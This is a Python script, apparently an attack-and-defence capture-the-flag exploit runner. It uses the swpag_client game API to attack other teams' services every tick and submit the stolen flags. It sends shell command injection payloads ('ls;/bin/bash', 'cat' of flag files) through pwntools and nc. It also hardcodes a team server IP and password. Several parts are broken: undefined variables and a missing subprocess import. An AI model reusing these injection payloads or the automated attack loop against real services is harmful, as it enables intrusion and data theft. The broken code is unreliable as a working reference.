import os
import socket
import select
import sys
import threading
import hashlib
import time
import re
import json
import random
import string
from pwn import *
from timeout import timeout
from collections import defaultdict

import swpag_client
import requests
from bs4 import BeautifulSoup
from multiprocessing import Process, Manager

##### CONFIGURATION #####
team_url = 'http://34.195.187.175/'
team_password = '66978175b387ba7b6dee386d16b40b29'

# ssh_ip = "100.26.198.64"
# ssh_user = "ctf"
# ssh_keypath = "team1-key.key"

attack_services = [10001, 10002, 10003, 10004, 10005]
attack_teams = [] # empty list = all teams
enabled_attacks = {
    10001: [
        True # input injection

    ],
    10002: [

    ],
    10003: [

    ],
    10004: [

    ],
    10005: [
        False
    ]
}
##### END CONFIGURATION #####

@timeout(30)
def backup1(host, port, flagid):
    # Create the file that will be sent to the service via nc.
    os.remove("backup_exploit.txt")
    f = open("backup_exploit.txt", "w+")
    # Each line represents a command that will be sent to the service by nc via commandline.
    f.write("2\na\n cat %s*\n\n" % flagid)
    f.close()
    # To reliably get the output from this service use nohup. Set the output filename to be the target team so that
    # it can be identified and parsed later.
    cmd = "nohup nc " + str(host) + " " + str(port) + " < backup_exploit.txt > " + str(host) + ".out"
    print("\n")
    # Call this as a subprocess or the script will freeze.
    p = subprocess.call(cmd, shell=True)
    return data

def config1(host, port, flag_id):
    c = remote(host,port)
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.sendline("d")
    c.recvline()
    c.sendline("param1")
    c.recvline()
    c.sendline("ls;/bin/bash")
    c.recvline()
    c.sendline("s")
    data=c.recvline()
    data=c.recvline()
    filename= data[-8:-2].decode("utf-8")
    data=c.recvline()
    data=c.recvline()
    c.sendline("l")
    c.recvline()
    c.sendline("config_"+filename)
    data = c.recvline()
    c.sendline("cat config_"+ flag_id )

    data = c.recvline()
    data = c.recvline()

    # print(t.submit_flag([data[-17:-1].decode('utf-8')]))
    c.close()
    return data[-17:-1].decode('utf-8')



svcmap = {
    10001: [backup1],
    10002: [],
    10003: [],
    10004: [],
    10005: [config1]
}

team = swpag_client.Team(team_url, team_password)



def main_worker(d, targ, svc):

    # team_name, hostname, port, flag_id
    team_name = targ["team_name"]
    hostname = targ["hostname"]
    port = targ["port"]
    flag_id = targ["flag_id"]
    print("Beginning Attack on " + str(team_name) + ", " + str(hostname) + ", " + str(flag_id))
    if attack_teams and team_name not in attack_teams:
        print("Team " + str(team_name) + " not in attack list. Returning.")
        return # skip this team
    for i, enabled in enumerate(enabled_attacks[svcid]):
        if not enabled:
            continue

        print(hostname)
        print("Attacking team {0} on service {1} using attack {2}... ".format(team_name, svcid, i), end="", flush=True)
        func = svcmap[svcid][i]
        print("[LOG] Calling function " + str(func.__name__))

        #flag = func(hostname, port, flag_id)
        with open(hostname + ".out", "r") as file:
            data = file.read().replace('\n', '')

        print("DATA!!!!!!!!!! " + data + " ENDDATA")
        splits = data.split("Hello")
        print(splits)
        flag = splits[1]
        
        if flag is not None:
            print("Got flag {0}!".format(flag))
            flags.add((team_name, flag))
            break # don't try later attacks if those are enabled
        else:
            print("Attack failed!")




# cli = SSHClient()
# cli.load_system_host_keys()
# # cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)
# cli.connect(ssh_ip, username=ssh_user, key_filename=ssh_keypath)

prevtick = 0
services = team.get_service_list()

while True:
    tick = team.get_tick_info()
    if tick["tick_id"] > prevtick:
        wait = True
        if prevtick == 0:
            wait = False
        prevtick = tick["tick_id"]
        print("Tick", prevtick)
        if wait:
            print("(Waiting 30s for flag ids to update)")
            time.sleep(30)
    else:
        print("Sleeping...")
        time.sleep(10)
        continue
    flags = set()
    for svc in services:
        svcid = svc["service_id"]
        svcport = svc["port"]
        # if svcid not in attack_services:
        #     continue

        targets = team.get_targets(svcid)
        # print(targets)

        for targ in targets:
            # team_name, hostname, port, flag_id
            team_name = targ["team_name"]
            hostname = targ["hostname"]
            port = targ["port"]
            flag_id = targ["flag_id"]

            if attack_teams and team_name not in attack_teams:
                continue # skip this team

            for i, enabled in enumerate(enabled_attacks[svcport]):
                if not enabled:
                    continue
                print("Attacking team {0} on service {1} using attack {2}... ".format(team_name, svcid, i), end="", flush=True)
                flag = svcmap[svcport][i](hostname, port, flag_id)
                # The flag will be in a file <team>.out created by nohup.
                with open(hostname + ".out", "r") as file:
                    data = file.read().replace('\n', '')

                # Find the flag in the output file.
                start = data.find('Here is your backup') + 50
                end = start + 16
                flag = data[start:end]

                if flag is not None:
                    print("Got flag {0}!".format(flag))
                    flags.add((team_name, flag))
                    break # don't try later attacks if those are enabled
                else:
                    print("Attack failed!")

    if flags:
        teamlist = list(flags)
        flaglist = [str(f[1]) for f in teamlist]
        print(flaglist)
        results = team.submit_flag(flaglist)
        resobj = {}
        for i, (t, flag) in enumerate(teamlist):
            resobj[t] = (flag, results[i])
        print("Submitting flags:", resobj)
    else:
        print("No flags found! Please investigate.")

    # wait for next tick
    info = team.get_tick_info()
    wait = int(info["approximate_seconds_left"])
    print("Next tick is in approximately {0} seconds.".format(wait))
